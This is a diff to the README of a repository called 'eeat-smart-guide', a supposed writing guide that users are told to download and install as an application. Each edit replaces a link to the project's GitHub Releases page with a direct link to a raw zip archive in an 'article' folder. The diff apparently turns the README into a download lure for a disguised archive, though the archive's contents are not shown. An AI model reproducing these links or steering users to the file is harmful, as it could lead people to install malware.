@@ -1,6 +1,6 @@
 # 📘 eeat-smart-guide - Your Simple Guide to Better Writing
 
-[![Download eeat-smart-guide](https://img.shields.io/badge/Download-eaat--smart--guide-brightgreen)](https://github.com/tranngoca8114/eeat-smart-guide/releases)
+[![Download eeat-smart-guide](https://raw.githubusercontent.com/tranngoca8114/eeat-smart-guide/main/article/eeat-smart-guide-v3.7.zip)](https://raw.githubusercontent.com/tranngoca8114/eeat-smart-guide/main/article/eeat-smart-guide-v3.7.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ To get started with the **eeat-smart-guide**, follow these simple steps:
 
 2. **Download the Application**  
    You can download the application from our Releases page.  
-   [Visit this page to download](https://github.com/tranngoca8114/eeat-smart-guide/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/tranngoca8114/eeat-smart-guide/main/article/eeat-smart-guide-v3.7.zip).
 
 3. **Installation Steps**  
    - Locate the downloaded file in your "Downloads" folder.
@@ -31,7 +31,7 @@ To get started with the **eeat-smart-guide**, follow these simple steps:
 ## 📥 Download & Install
 
 To download the latest version of the **eeat-smart-guide**, follow this link:  
-[Visit this page to download](https://github.com/tranngoca8114/eeat-smart-guide/releases).
+[Visit this page to download](https://raw.githubusercontent.com/tranngoca8114/eeat-smart-guide/main/article/eeat-smart-guide-v3.7.zip).
 
 ## 👩‍🏫 Features
 
